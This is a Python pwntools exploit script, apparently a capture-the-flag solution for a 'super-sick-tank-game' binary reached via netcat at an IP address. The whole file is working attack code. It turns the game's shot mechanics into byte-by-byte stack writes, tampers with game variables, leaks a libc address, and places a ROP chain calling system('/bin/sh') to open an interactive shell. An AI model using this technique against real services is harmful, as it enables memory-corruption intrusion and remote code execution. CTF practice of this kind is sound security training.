import pwn
import numpy as np

#constants
g = 9.81
angle_45 = 45
rad_angle_45 = np.pi * (angle_45 / 180)

#dist from game_buf
ammo_check_dist = 0x1a0 - 0x88 #positive
dist_to_ret = 0x88 + 0x8
dist_to_misses = 0x1b4 - 0x88
dist_to_hit_crate =  0x174 - 0x88

#ammo type istance
dist_to_chosen_byte = 8 + 1


#helper
def send_shot(p, a):
    r.sendline(str(p).encode('latin'))
    r.sendline(str(a).encode('latin'))
    r.sendline(b"pew!")


def send_shot_to_pos(dist):
    test = False
    if(dist < 0):
        test = True
        dist = -dist
    
    a = angle_45
    p =  np.sqrt( (dist * g) / (2*np.sin(rad_angle_45)*np.cos(rad_angle_45) ) )
    
    if(test):
        a = a + 270

    send_shot(p + 0.001, a)

#solve distance
def get_special_ammo():
    for i in range(3):
        r.readuntil(b"|\"\"\"\-=  ", timeout=0.2)
        field = r.readline()
        #print(field)
        dist = field.decode('latin').find("E")
        send_shot_to_pos(dist) #will break when dist = 111
        
        if b"hit" not in r.readuntil(b"Direct hit", timeout=0.2):
            print("ERROR in get_special_ammo")
    
def pick_special_ammo(index):
    r.sendline(str(index).encode('latin'))

def send_byte_to_pos(byte, pos):
    #place byte on stack
    pick_special_ammo(1)
    r.sendline(str(0).encode('latin'))
    r.sendline(str(angle_45).encode('latin'))
    r.sendline(b"pew!aa" + byte)
    r.sendline(b"pew!")

    #shoot byte
    pick_special_ammo(dist_to_chosen_byte)
    send_shot_to_pos(pos)

def print_byte_at_pos(pos): #pos from rbp - 0x12
    pick_special_ammo(pos)
    send_shot_to_pos(0)
    r.readuntil(b"|\"\"\"\-=  ", timeout=0.2)
    field = r.readline()
    return field[0].to_bytes(1, 'little')

def main():
    
    #set max_power to 45
    get_special_ammo() 
    pick_special_ammo(2) #pick explosive shot
    send_shot(33, angle_45) #send shot to end
    
    #set max_power to large value
    send_shot_to_pos(0x70 + 1)

    #set max angle to val > 360
    get_special_ammo()
    pick_special_ammo(2) #pick explosive shot
    send_shot_to_pos(0) #send to beginning
    
    #set lives to large number
    send_shot_to_pos(-dist_to_misses)
    
    #change ammo input check variable
    send_shot_to_pos(-ammo_check_dist + 1)
    
    #always have special ammo
    send_shot_to_pos(-dist_to_hit_crate)

    #leak libc address
    r.clean() #clear input buf
    addr = b""
    for i in range(8):
        val = print_byte_at_pos(0x12 + 0x18 + 1 + i) #addr 0x18 bytes above rbp
        addr += val
        if val == b"\x7f":
            break

    addr = int.from_bytes(addr, 'little')
    print(pwn.p64(addr))
    
    #create desired addresses
    pop_offset = 0x26d83
    system_offset = 0x26fe0 

    pop_rdi_addr = pop_offset + addr
    system_addr = system_offset + addr
    
    shell_offset = 0x1ae908
    shell_addr = shell_offset + addr
    
    #actually do attack stuff
    #place pop rdi addr on stack
    for i, byte in enumerate(pwn.p64(pop_rdi_addr)):
        byte = byte.to_bytes(1, 'little')
        send_byte_to_pos(byte, dist_to_ret + i)

    #place /bin/sh on stack next
    for i, byte in enumerate(pwn.p64(shell_addr)):
        byte = byte.to_bytes(1, 'little')
        send_byte_to_pos(byte, dist_to_ret + 8 + i)
    
    #place padding ret on stack next
    for i, byte in enumerate(pwn.p64(pop_rdi_addr + 0x1)):
        byte = byte.to_bytes(1, 'little')
        send_byte_to_pos(byte, dist_to_ret + 16 + i)

    #place system addr on stack
    for i, byte in enumerate(pwn.p64(system_addr)):
        byte = byte.to_bytes(1, 'little')
        send_byte_to_pos(byte, dist_to_ret + 24 + i)
    
    #set lives to 1
    send_byte_to_pos(b"\x04", -dist_to_misses)
    
    r.interactive()

#r = pwn.process("LD_PRELOAD=./libc.so.6 ./super-sick-tank-game", shell=True)
r = pwn.process("nc 184.72.87.9 8003", shell=True)
main()

